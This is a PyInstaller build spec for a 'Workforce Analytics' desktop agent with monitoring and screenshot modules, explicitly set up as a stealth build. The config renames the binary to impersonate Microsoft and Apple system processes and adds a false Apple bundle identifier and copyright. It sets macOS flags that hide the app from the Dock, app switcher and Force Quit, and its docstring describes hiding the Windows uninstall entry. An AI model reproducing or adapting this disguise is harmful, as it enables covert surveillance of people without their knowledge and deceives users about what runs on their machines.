# -*- mode: python ; coding: utf-8 -*-
"""PyInstaller spec for the Workforce Analytics desktop agent — STEALTH build.

The binary is renamed to a system-looking name on each platform so it blends
into the OS process list:
  Windows  → MicrosoftTelemetryHost.exe   (Task Manager "Image Name")
  macOS    → com.apple.telemetryd          (Activity Monitor "Process Name")

The Info.plist on macOS sets LSUIElement + LSBackgroundOnly to suppress any
Dock / menu-bar presence.  The Inno Setup script on Windows uses
CreateUninstallRegKey=no + a manual SystemComponent registry key so the app
never appears in Control Panel / Apps & features.

Run from the `agent/packaging` directory:
    pyinstaller --noconfirm WorkforceAgent.spec
"""

import sys
from pathlib import Path

SPEC_DIR  = Path(SPECPATH)
AGENT_DIR = SPEC_DIR.parent
REPO_ROOT = AGENT_DIR.parent

is_win = sys.platform.startswith("win")
is_mac = sys.platform == "darwin"

# ── Exe / bundle name — system-like on each platform ─────────────────────────
if is_win:
    EXE_NAME    = "MicrosoftTelemetryHost"   # Task Manager Image Name
elif is_mac:
    EXE_NAME    = "com.apple.telemetryd"      # Activity Monitor Process Name
    BUNDLE_NAME = "com.apple.telemetryd.app"  # .app folder (hidden in /Applications)
else:
    EXE_NAME    = "telemetryd"

# ── Icons ──────────────────────────────────────────────────────────────────────
icon_path = None
if is_win:
    p = SPEC_DIR / "icons" / "icon.ico"
    icon_path = str(p) if p.exists() else None
elif is_mac:
    p = SPEC_DIR / "icons" / "icon.icns"
    icon_path = str(p) if p.exists() else None

datas = []
png = SPEC_DIR / "icons" / "icon.png"
if png.exists():
    datas.append((str(png), "agent_assets"))

hiddenimports = [
    "agent.api",
    "agent.config",
    "agent.consent",
    "agent.identity",
    "agent.monitor",
    "agent.screenshot",
    "agent.tray",
    "PIL._tkinter_finder",
]
if is_win:
    hiddenimports.append("pystray._win32")
elif is_mac:
    hiddenimports.append("pystray._darwin")

a = Analysis(
    [str(SPEC_DIR / "launcher.py")],
    pathex=[str(REPO_ROOT)],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name=EXE_NAME,           # ← renamed to system-like name
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    runtime_tmpdir=None,
    console=False,           # no console window
    icon=icon_path,
)

if is_mac:
    app = BUNDLE(
        exe,
        name=BUNDLE_NAME,
        icon=icon_path,
        # Bundle identifier mimics an Apple system daemon
        bundle_identifier="com.apple.telemetryd",
        info_plist={
            # ── Visibility suppression ─────────────────────────────────────
            # LSUIElement: hides from Dock AND the app switcher (Cmd+Tab)
            "LSUIElement": True,
            # LSBackgroundOnly: suppresses menu-bar icon AND removes from
            # the "Force Quit Applications" dialog
            "LSBackgroundOnly": True,
            # NSUIElement: belt-and-suspenders for older macOS
            "NSUIElement": True,
            # Suppress "app is not responding" alerts
            "LSSupressUserNotification": True,
            # ── Metadata disguise ─────────────────────────────────────────
            "CFBundleDisplayName": "Apple Telemetry Daemon",
            "CFBundleName":        "com.apple.telemetryd",
            "CFBundleVersion":     "1.0.0",
            "CFBundleShortVersionString": "1.0",
            "NSHumanReadableCopyright": "Copyright © Apple Inc.",
            # High-res support (required for any modern app bundle)
            "NSHighResolutionCapable": True,
        },
    )
